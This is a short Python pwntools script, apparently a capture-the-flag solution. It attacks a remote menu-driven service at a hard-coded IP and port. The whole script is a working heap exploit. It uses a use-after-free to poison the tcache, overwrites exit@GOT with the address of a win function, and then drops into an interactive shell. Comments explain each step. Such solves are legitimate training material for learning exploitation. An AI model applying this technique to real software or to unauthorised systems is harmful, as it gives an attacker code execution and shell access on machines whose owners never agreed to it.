from pwn import *

io = remote('152.118.201.241', 3023)

def add(idx, title, page):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.sendlineafter(b'Title: ', title)
    io.sendlineafter(b'Page: ', str(page).encode())

def remove(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'?: ', str(idx).encode())

def edit(idx, title, page):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'?: ', str(idx).encode())
    io.sendlineafter(b'Title: ', title)
    io.sendlineafter(b'Page: ', str(page).encode())

# Setup chunks
add(0, b'A', 111)

# Put chunk into Tcache
remove(0)

# UAF: Point Tcache to exit@GOT
exit_got = 0x602058
edit(0, p64(exit_got), 222)

# Drain Tcache
add(1, b'B', 333)

# Overwrite exit@GOT with win() base address
# Using 0x4007b7 because the push rbp perfectly aligns the stack when called via exit()
win_addr = 0x4007b7
add(2, p64(win_addr), 444)

# Trigger win()
io.sendlineafter(b'> ', b'5')

# Shell
io.interactive()